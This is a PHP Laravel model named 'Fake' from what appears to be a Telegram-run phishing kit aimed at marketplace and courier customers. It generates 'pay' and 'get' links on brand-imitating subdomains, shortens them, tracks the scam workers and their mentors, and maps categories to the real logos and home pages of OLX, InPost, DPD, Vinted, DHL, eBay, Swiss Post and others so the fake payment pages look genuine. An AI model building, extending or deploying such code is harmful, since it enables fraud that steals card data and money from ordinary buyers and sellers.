<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Collection;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Log;
use Throwable;

/**
 * App\Models\Fake
 *
 * @property int $id
 * @property int $track_id
 * @property string|null $original_url
 * @property string|null $title
 * @property string $price
 * @property string|null $img
 * @property string|null $recipient
 * @property string|null $address
 * @property int $category_id
 * @property int $telegram_id
 * @property \Illuminate\Support\Carbon|null $created_at
 * @property \Illuminate\Support\Carbon|null $updated_at
 * @method static \Illuminate\Database\Eloquent\Builder|Fake newModelQuery()
 * @method static \Illuminate\Database\Eloquent\Builder|Fake newQuery()
 * @method static \Illuminate\Database\Eloquent\Builder|Fake query()
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereAddress($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereCategoryId($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereCreatedAt($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereId($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereImg($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereOriginalUrl($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Fake wherePrice($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereRecipient($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereTelegramId($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereTitle($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereTrackId($value)
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereUpdatedAt($value)
 * @mixin \Eloquent
 * @property-read \App\Models\Category $category
 * @property-read \App\Models\TelegramUser $telegramUser
 * @property array|null $details
 * @property-read Collection|\App\Models\TelegramUser[] $takeUsers
 * @property-read int|null $take_users_count
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereDetails($value)
 * @property-read \App\Models\Country|null $country
 * @property-read string|null $locale
 * @property string|null $sent_from
 * @method static \Illuminate\Database\Eloquent\Builder|Fake whereSentFrom($value)
 */
class Fake extends Model
{
    protected $guarded = [];
    protected $appends = ['locale'];

    use HasFactory;

    public function getLocaleAttribute(): ?string
    {
        return $this->category->country->locale ?? Country::locale(Country::POLAND);
    }

    public function telegramUser()
    {
        return $this->belongsTo(TelegramUser::class, 'telegram_id');
    }

    public function category()
    {
        return $this->belongsTo(Category::class, 'category_id');
    }

    public function country()
    {
        return $this->hasOneThrough(Country::class, Category::class, 'id', 'id', 'category_id', 'country_id');
    }

    public function takeUsers()
    {
        return $this->belongsToMany(TelegramUser::class, 'takes', 'fake_id', 'telegram_id');
    }

    public function allTakeUsers(): Collection
    {
        $users = [];
        try {
            $telegramUser = $this->telegramUser;
            $users[] = $telegramUser;
            if ($mentor = $telegramUser->mentor()) {
                $users[] = $mentor->account;
            }
        } catch (Throwable $exception) {
            Log::error("allTakeUsers: {$exception->getMessage()}");
        }
        return $this->takeUsers->merge($users);
    }

    /**
     * @return array
     */
    public function fullName(): array
    {
        list($fname, $lname) = array_pad(explode(' ', $this->recipient), 2, '');
        return [
            'fname' => $fname,
            'lname' => $lname,
        ];
    }

    /**
     * @param null $path
     * @param array $parameters
     * @param false $secure
     * @return string
     */
    public function url($path = null, array $parameters = [], bool $secure = false): string
    {
        $protocol = !$secure ? 'http' : 'https';
        $domain = config('app.domain');
        $subdomain = collect(explode(',', setting("{$this->category->name}_{$this->locale}", $this->category->name)))->first();
        $url = "$protocol://$subdomain.$domain";
        $path = trim($path, '/');
        $query = http_build_query($parameters);
        if (!empty($path)) $url = "$url/$path";
        if (!empty($parameters)) $url = "$url?$query";

        return $url;
    }

    /**
     * @param bool $isPay
     * @param bool $secure
     * @return string
     */
    public function link(bool $isPay = false, bool $secure = false): string
    {
        $query = '?' . (($isPay) ? 'pay' : 'get') . '=1&' . http_build_query(['track_id' => $this->track_id]);
        return $this->url("/$query", [], $secure);
    }

    public function linkForGet(bool $secure = false): string
    {
        return $this->link(false, $secure);
    }

    public function linkForPay(bool $secure = false): string
    {
        return $this->link(true, $secure);
    }

    public function shortUrl(bool $isPay = false, bool $secure = false): string
    {
        return shortUrl($this->link($isPay, $secure));
    }

    public function adminChatLink(bool $secure = false): string
    {
        return $this->url('/', ['track_id' => $this->track_id, 'from' => 'admin'], $secure);
    }

    public function price(): string
    {
        return $this->price . ' ' . ($this->country->currency ?? setting('currency'));
    }

    public function priceFormat($format = null, $dec = ','): string
    {
        $currency = $this->country->currency ?? setting('currency');
        $price = number_format(str_replace(',', '.', empty($this->price) ? 0 : $this->price), 2, $dec, '');
        preg_match("%^([\d]+)[$dec]([\d]{1,2})$%", $price, $matches);
        if (!is_null($format) && !empty($matches)) {
            return $matches[1] . sprintf($format, "$dec$matches[2] $currency");
        }
        return "$price $currency";
    }

    public function logo(): string
    {
        switch ($this->category->name) {
            case Category::OLX:
                $logo = 'https://i.imgur.com/8JX0BdP.png';
                break;
            case Category::INPOST:
                $logo = 'https://i.imgur.com/0Eilnlp.png';
                break;
            case Category::DPD:
                $logo = 'https://i.imgur.com/gZRSLfp.png';
                break;
            case Category::POCZTA:
                $logo = 'https://i.imgur.com/HjjRFzY.jpg';
                break;
            case Category::VINTED:
                $logo = 'https://i.imgur.com/aPK7aHK.png';
                break;
            case Category::ALLEGROLOKALNIE:
                $logo = 'https://allegrolokalnie.pl/images/lokalnie-logo.svg';
                break;
            case Category::BAZOS:
                $logo = 'https://www.bazos.cz/obrazky/bazos.svg';
                break;
            case Category::CBAZAR:
                $logo = 'https://www.cbazar.cz/web/images/logo.png';
                break;
            case Category::SBAZAR:
                $logo = "https://www.sbazar.cz/static/img/logo-sbazar.svg";
                break;
            case Category::POSTAONLINE:
                $logo = "https://www.postaonline.cz/PostaOnline-mix-theme/images/headerFooter/logoCP.png";
                break;
            case Category::PPL:
                $logo = "https://www.ppl.cz/documents/20122/0/Logo.png/048e91eb-c0b3-9f15-a8aa-e73baa057594?t=1601838151776";
                break;
            case Category::ZASILKOVNA:
                $logo = "https://upload.wikimedia.org/wikipedia/commons/5/50/Zasilkovna_logo.png";
                break;
            case Category::POST:
                $logo = "https://www.post.ch/-/media/portal-opp/global/logos/logo---die-post.svg?sc_lang=de";
                break;
            case Category::TUTTI:
                $logo = "https://scontent.fevn12-1.fna.fbcdn.net/v/t1.6435-9/44849547_2131408863557061_7794346940421898240_n.png?_nc_cat=110&ccb=1-5&_nc_sid=09cbfe&_nc_ohc=SYMS-OHAHPEAX-TcaVp&_nc_ht=scontent.fevn12-1.fna&oh=00_AT-DnMHls5R-g2qGKJsaIUxgNbExdX6Ze_teXqqra8ig6w&oe=629761C0";
                break;
            case Category::ANIBIS:
                $logo = "https://www.anibis.ch/static/media/ani-logo.9edb2a63.png";
                break;
            case Category::DHL:
                $logo = "https://www.dhl.de/etc.clientlibs/redesign/clientlibs/static/resources/icons/dhl-official.svg";
                break;
            case Category::EBAY:
                $logo = "https://upload.wikimedia.org/wikipedia/commons/1/1b/EBay_logo.svg";
                break;
            case Category::LOCANTO:
                $logo = "https://static.locanto.info/assets/220525_133922/images/logo/locanto_color.svg";
                break;
            case Category::QUOKA:
                $logo = "https://www.quoka.de/assets/img/quoka/quoka_logo.svg";
                break;
            default:
                $logo = 'https://i.imgur.com/0Eilnlp.png';
        }

        return $logo;
    }

    public function originalUrl($categoryName = null): string
    {
        $categoryName = $categoryName ?? $this->category->name ?? null;
        switch ($categoryName) {
            case Category::OLX:
                $url = "https://www.olx.pl";
                break;
            case Category::INPOST:
                $url = "https://inpost.pl";
                break;
            case Category::DPD:
                $url = "https://www.dpd.com";
                break;
            case Category::POCZTA:
                $url = "https://www.poczta.pl";
                break;
            case Category::VINTED:
                $url = "https://www.vinted.pl";
                break;
            case Category::ALLEGROLOKALNIE:
                $url = "https://allegrolokalnie.pl";
                break;
            case Category::BAZOS:
                $url = "https://www.bazos.cz";
                break;
            case Category::SBAZAR:
                $url = "https://www.sbazar.cz";
                break;
            case Category::CBAZAR:
                $url = "https://www.cbazar.cz";
                break;
            case Category::POSTAONLINE:
                $url = "https://www.postaonline.cz";
                break;
            case Category::PPL:
                $url = "https://www.ppl.cz";
                break;
            case Category::ZASILKOVNA:
                $url = "https://www.zasilkovna.cz";
                break;
            case Category::POST:
                $url = "https://www.post.ch";
                break;
            case Category::TUTTI:
                $url = "https://tutti.ch";
                break;
            case Category::ANIBIS:
                $url = "https://www.anibis.ch";
                break;
            default:
                $url = "https://www.google.com";
                break;
        }
        return $url;
    }

    public function getTrackIdFromWorker(): string
    {
        return getTrackIdFromWorker($this->track_id);
    }
}
